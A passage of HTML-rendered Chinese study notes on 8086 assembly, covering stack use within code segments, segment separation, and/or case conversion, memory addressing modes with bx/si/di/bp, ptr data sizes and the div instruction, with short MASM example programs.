class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">start:mov bx,0;程序的第一条指令</span><br><span class="line">mov ax,0</span><br><span class="line"></span><br><span class="line">        mov cx,8</span><br><span class="line">    s:add ax,cs:[bx]</span><br><span class="line">        add bx,2</span><br><span class="line">        loop s</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="6-1-在代码段中使用栈"><a href="#6-1-在代码段中使用栈" class="headerlink" title="6.1 在代码段中使用栈"></a>6.1 在代码段中使用栈</h2><p>程序运行时，定义的数据存放在cs:0~cs:F单元中，共8个字单元。依次将这8个字单元中的数据入栈，然后再依次出栈到这8个字单元中，从而实现数据的逆序存放。（将cs:10~cs:2F的内存空间当作栈来用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">;用dw定义16个字型数据，在程序加载后，将取得16个字的内存空间存放这16个数据</span><br><span class="line">;在后面的程序中将这段空间当作栈来使用</span><br><span class="line">start:mov ax,cs</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,30h;将设置栈顶ss:sp指向cs:30</span><br><span class="line"></span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,8</span><br><span class="line">s:push cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s;将代码段0~15单元中的8个字型数据依次入栈</span><br><span class="line"></span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,8</span><br><span class="line">s0:pop cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s0;出栈8个字型数据到代码段0~15单元中</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start;指明程序的入口在start处</span><br></pre></td></tr></table></figure><h2 id="6-2-将数据、代码、栈放入不同的段"><a href="#6-2-将数据、代码、栈放入不同的段" class="headerlink" title="6.2 将数据、代码、栈放入不同的段"></a>6.2 将数据、代码、栈放入不同的段</h2><p>在前面的内容中，我们在程序中用到了数据和栈，将数据、栈和代码都放到了一个段里面。我们在编程的时候要注意何处是数据，何处是栈，何处是代码。这样做会产生两个问题：</p><ol><li>把它们放到一个段中使程序显得混乱</li><li>前面数据中处理的数据很少，用到的栈空间也小，加上没有多长的代码，放到一个段里面没有问题。但如果数据、栈、代码需要的空间超过64KB，就不能放在一个段中（8086模式中一个段的容量不能大于64KB）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line">data segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">data ends</span><br><span class="line">stack segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">stack ends</span><br><span class="line">code segment</span><br><span class="line">start:mov ax,stack;将名为stack段的段地址送入ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,20h</span><br><span class="line">;设置栈顶ss:sp指向stack:20(在整个程序中是cs:30,但在栈段是从0:10~0:2F,所以是stack:20)</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax;ds指向data段</span><br><span class="line">mov bx,0;ds:bx指向data段中的第一个单元</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:push [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s;将data段中的0~15单元中的8个字型数据依次入栈</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s0:pop [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s0;依次出栈8个字型数据到data段的0~15单元中</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="7-更灵活的定位内存地址的方法"><a href="#7-更灵活的定位内存地址的方法" class="headerlink" title="7. 更灵活的定位内存地址的方法"></a>7. 更灵活的定位内存地址的方法</h1><h2 id="7-1-and和or指令"><a href="#7-1-and和or指令" class="headerlink" title="7.1 and和or指令"></a>7.1 and和or指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">and指令:逻辑与指令，按位进行与运算(1and1=1,1and0=0,0and0=0)</span><br><span class="line">mov al,01100011B</span><br><span class="line">and al,00111011B</span><br><span class="line">执行后:al=00100011B</span><br><span class="line"></span><br><span class="line">or指令:逻辑或指令，按位进行或运算(1or1=1,1or0=1,0or0=0)</span><br><span class="line">mov al,01100011B</span><br><span class="line">or al,00111011B</span><br><span class="line">执行后:al=01111011B</span><br></pre></td></tr></table></figure><h2 id="7-2-ASCII码"><a href="#7-2-ASCII码" class="headerlink" title="7.2 ASCII码"></a>7.2 ASCII码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a-&gt;61h,b-&gt;62h</span><br></pre></td></tr></table></figure><h2 id="7-3-以字符形式给出的数据"><a href="#7-3-以字符形式给出的数据" class="headerlink" title="7.3 以字符形式给出的数据"></a>7.3 以字符形式给出的数据</h2><p>在汇编程序中，用’’的方式指明数据是以字符的形式给出的，编译器将它们转化为相对应的ASCII码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data</span><br><span class="line">data segment</span><br><span class="line">db &#x27;unIX&#x27;</span><br><span class="line">db &#x27;foRK&#x27;</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:mov al,&#x27;a&#x27;</span><br><span class="line">mov bl,&#x27;b&#x27;</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="7-4-大小写转换的问题"><a href="#7-4-大小写转换的问题" class="headerlink" title="7.4 大小写转换的问题"></a>7.4 大小写转换的问题</h2><p>在codesg中填写代码，将tadasg中的第一个字符串转化为大写，第二个字符串转化为小写。</p><img src="/posts/de6e58e0/ASCII%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6.jpg" class="" title="ASCII码表"><p>方法一：小写字母的ASCII码值比大写字母的ASCII码值大20H。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;BaSiC&#x27;</span><br><span class="line">db &#x27;iNfOrMaTiOn&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,5</span><br><span class="line">s:mov al,[bx]</span><br><span class="line">如果(al)&gt;61H,则为小写字母的ASCII码,则:sub al,20h</span><br><span class="line">mov [bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>方法二：大写字母的第6位全为0，小写字母的第6位全为1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;BaSiC&#x27;</span><br><span class="line">db &#x27;iNfOrMaTiOn&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax;设置ds指向datasg段</span><br><span class="line">mov bx,0;设置(bx)=0,ds:bx指向&#x27;BaSiC&#x27;的第一个字母</span><br><span class="line">mov cx,5</span><br><span class="line">s:mov al,[bx];将ASCII码从ds:bx所指向的单元中取出</span><br><span class="line">and al,11011111B;将al中的ASCII码的第6位置0,变为大写字母</span><br><span class="line">mov [bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov bx,5;设置(bx)=5,ds:bx指向&#x27;iNfOrMaTiOn&#x27;的第一个字母</span><br><span class="line">mov cx,11</span><br><span class="line">s0: mov al,[bx]</span><br><span class="line">or al,00100000B</span><br><span class="line">mov [bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="7-5-bx-idata"><a href="#7-5-bx-idata" class="headerlink" title="7.5 [bx+idata]"></a>7.5 [bx+idata]</h2><p>[bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata</p><p>mov ax,[bx+200]-&gt;(ax)=((ds)*16+(bx)+200)</p><p>简化7.4方法二(但这个一定要两个字符串长度相同)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    mov ax,datasg</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov bx,0</span><br><span class="line"></span><br><span class="line">    mov cx,5</span><br><span class="line">s:mov al,[bx];定位第一个字符串中的字符</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx],al</span><br><span class="line">mov al,[5+bx];定位第二个字符串中的字符</span><br><span class="line">or al,00100000b</span><br><span class="line">mov [5+bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>[bx]=0[bx]，[5+bx]=5[bx]</p><h2 id="7-6-SI-和-DI"><a href="#7-6-SI-和-DI" class="headerlink" title="7.6 SI 和 DI"></a>7.6 SI 和 DI</h2><p>si 和 di不能够分成两个8位寄存器来使用。</p><p>用ds:si指向要复制的源始字符串，用ds:di指向复制的目的空间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line"> db &#x27;welcome to masm!&#x27;</span><br><span class="line"> db &#x27;................&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0</span><br><span class="line">mov di,16;复制到它后面的数据区，后面数据区的偏移地址为16</span><br><span class="line"></span><br><span class="line">mov cx,8;一次复制2个字节，一共循环8次</span><br><span class="line">s:mov ax,[si]</span><br><span class="line">mov [di],ax</span><br><span class="line">add si,2</span><br><span class="line">add di,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>利用[bx(si或di)+idata]的方式使程序变简洁：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0</span><br><span class="line">mov cx,8</span><br><span class="line">s:mov ax,0[si]</span><br><span class="line">mov 16[si],ax</span><br><span class="line">add si,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="7-7-bx-si-和-bx-di"><a href="#7-7-bx-si-和-bx-di" class="headerlink" title="7.7 [bx+si]和[bx+di]"></a>7.7 [bx+si]和[bx+di]</h2><p>[bx+si]表示一个内存单元，它的偏移地址为(bx)+(si)，[bx+di]同。</p><p>mov ax,[bx+si]-&gt;(ax)=((ds)*16+(bx)+(si))</p><p>mov ax,[bx+si]=mov ax,[bx][si]</p><h2 id="7-8-bx-si-idata-和-bx-di-idata"><a href="#7-8-bx-si-idata-和-bx-di-idata" class="headerlink" title="7.8 [bx+si+idata]和[bx+di+idata]"></a>7.8 [bx+si+idata]和[bx+di+idata]</h2><p>[bx+si+idata]表示一个内存单元，它的偏移地址为(bx)+(si)+idata，[bx+di+idata]同。</p><p>mov ax,[bx+si+idata]-&gt;(ax)=((ds)*16+(bx)+(si)+idata)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  mov ax,[bx+si+idata]</span><br><span class="line">= mov ax,idata[bx][si]</span><br><span class="line">= mov ax,[bx].idata[si]</span><br><span class="line">= mov ax,[bx][si].idata</span><br></pre></td></tr></table></figure><h2 id="7-9-不同寻址方式的灵活应用"><a href="#7-9-不同寻址方式的灵活应用" class="headerlink" title="7.9 不同寻址方式的灵活应用"></a>7.9 不同寻址方式的灵活应用</h2><p>编程，将datasg段中每个单词首字母改为大写字母(用bx定位每行的起始地址，用3定位要修改的列，用[bx+idata]对目标单元进行寻址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;1..file.........&#x27;;16个字节</span><br><span class="line">db &#x27;2..edit.........&#x27;</span><br><span class="line">db &#x27;3..search.......&#x27;</span><br><span class="line">db &#x27;4..view.........&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start: mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s:  mov al,[bx+3]</span><br><span class="line">and al,11011111b</span><br><span class="line">        mov [bx+3],al</span><br><span class="line">add bx,16</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>编程，将datasg段中每个单词改为大写字母(用bx定位每行的起始地址，用si定位要修改的列，用[bx+si]方式对目标单元进行寻址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;ibm.............&#x27;</span><br><span class="line">db &#x27;dec.............&#x27;</span><br><span class="line">db &#x27;dos.............&#x27;</span><br><span class="line">db &#x27;vax.............&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s0: mov dx,cx;将外层循环的cx值保存在dx中</span><br><span class="line">mov si,0</span><br><span class="line"></span><br><span class="line">mov cx,3;cx设置为内层循环的次数</span><br><span class="line">s:mov al,[bx+si]</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx+si],al</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">add bx,16</span><br><span class="line">mov cx,dx;用dx中存放的外层循环的计数值恢复cx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>如果dx也被用了呢？所有寄存器都被用了呢？可以使用内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;ibm.............&#x27;</span><br><span class="line">db &#x27;dec.............&#x27;</span><br><span class="line">db &#x27;dos.............&#x27;</span><br><span class="line">db &#x27;vax.............&#x27;</span><br><span class="line">dw 0;定义一个字，用来暂存cx</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s0: mov ds:[40h],cx;将外层循环的cx值保存在datasg:40h单元中</span><br><span class="line">mov si,0</span><br><span class="line"></span><br><span class="line">mov cx,3;cx设置为内层循环的次数</span><br><span class="line">s:mov al,[bx+si]</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx+si],al</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">add bx,16</span><br><span class="line">mov cx,ds:[40h];用datasg:40h单元中的值恢复cx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>如果需要保存多个数据，需要记住哪个数据暂存在哪个单元中，这样程序容易混乱。一般来说，在需要暂存数据的时候，我们都应该使用栈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg,ss:stacksg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;ibm.............&#x27;</span><br><span class="line">db &#x27;dec.............&#x27;</span><br><span class="line">db &#x27;dos.............&#x27;</span><br><span class="line">db &#x27;vax.............&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">stacksg segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0</span><br><span class="line">stacksg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,stacksg</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line">mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s0: push cx;将外层循环的cx值压栈</span><br><span class="line">mov si,0</span><br><span class="line"></span><br><span class="line">mov cx,3;cx设置为内层循环的次数</span><br><span class="line">s:mov al,[bx+si]</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx+si],al</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">add bx,16</span><br><span class="line">pop cx;从栈顶弹出原cx的值恢复cx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="8-数据处理"><a href="#8-数据处理" class="headerlink" title="8. 数据处理"></a>8. 数据处理</h1><p>reg表示一个寄存器，sreg表示一个段寄存器。</p><p>reg有ax, bx, cx, dx, ah, al, bh, bl, ch, cl, dh, dl, sp, bp, si, di</p><p>sreg有ds, ss, cs, es</p><h2 id="8-1-bx-si-di和bp"><a href="#8-1-bx-si-di和bp" class="headerlink" title="8.1 bx, si, di和bp"></a>8.1 bx, si, di和bp</h2><ol><li>在8086CPU中又有这4个寄存器可以在“[]”中进行内存单元寻址</li><li>在“[]”中，这4个寄存器可以单个出现，或只能以4种组合出现：bx和si, bx和di, bp和si, bp和di</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,[bp+di]</span><br></pre></td></tr></table></figure><ol><li>只要在“[]”中使用寄存器bp，而指令中没有显性地给出段地址，段地址就默认在ss中</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bp](ax)=((ss)*16+(bp))</span><br><span class="line">mov ax,[bp+si+idata](ax)=((ss)*16+(bp)+(si)+idata)</span><br></pre></td></tr></table></figure><h2 id="8-2-数据的位置"><a href="#8-2-数据的位置" class="headerlink" title="8.2 数据的位置"></a>8.2 数据的位置</h2><p>指令在执行前，所要处理的数据可以在3个地方：CPU内部、内存、端口。</p><div class="table-container"><table><thead><tr><th>汇编指令</th><th>指令执行前数据的位置</th></tr></thead><tbody><tr><td>mov bx,[0]</td><td>内存，ds:0单元</td></tr><tr><td>mov bx,ax</td><td>CPU内部，ax寄存器</td></tr><tr><td>mov bx,1</td><td>CPU内部，指令缓冲器</td></tr></tbody></table></div><h3 id="8-2-1-数据位置的表达"><a href="#8-2-1-数据位置的表达" class="headerlink" title="8.2.1 数据位置的表达"></a>8.2.1 数据位置的表达</h3><ol><li>立即数(idata)</li><li>寄存器</li><li>段地址(SA)和偏移地址(EA)</li></ol><h3 id="8-2-2-寻址方式"><a href="#8-2-2-寻址方式" class="headerlink" title="8.2.2 寻址方式"></a>8.2.2 寻址方式</h3><img src="/posts/de6e58e0/%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93.png" class="" title="寻址方式"><h2 id="8-3-数据的长度"><a href="#8-3-数据的长度" class="headerlink" title="8.3 数据的长度"></a>8.3 数据的长度</h2><p>8086CPU可以处理两种尺寸的数据，byte和word。</p><ol><li>通过寄存器名指明要处理的数据的尺寸</li><li>在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或byte</li></ol><p>例如下面的指令中，用word ptr指明了指令访问的内存单元是一个字单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov word ptr ds:[0],1</span><br><span class="line">inc word ptr [bx]</span><br></pre></td></tr></table></figure><p>下面的指令中，用byte ptr指明了指令访问的内存单元是一个字节单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov byte ptr ds:[0],1</span><br><span class="line">add byte ptr [bx],2</span><br></pre></td></tr></table></figure><ol><li>其他方法</li></ol><p>有些指令默认了访问的是字单元还是字节单元，比如push [1000H]就不用指明访问的是字单元还是字节单元。因为push指令只进行字操作。</p><h2 id="8-4-div指令"><a href="#8-4-div指令" class="headerlink" title="8.4 div指令"></a>8.4 div指令</h2><p>div是除法指令，使用div做除法时应注意以下问题</p><ol><li>除数：有8位和16位两种，在一个reg或内存单元中。</li><li>被除数：默认放在AX  或  DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。</li><li>结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">div reg</span><br><span class="line">div 内存单元</span><br><span class="line"></span><br><span class="line">div byte ptr ds:[0]</span><br><span class="line">含义:(al)=(ax)/((ds)*16+0)的商</span><br><span class="line">(ah)=(ax)/((ds)*16+0)的余数</span><br><span class="line"></span><br><span class="line">div word ptr es:[0]</span><br><span 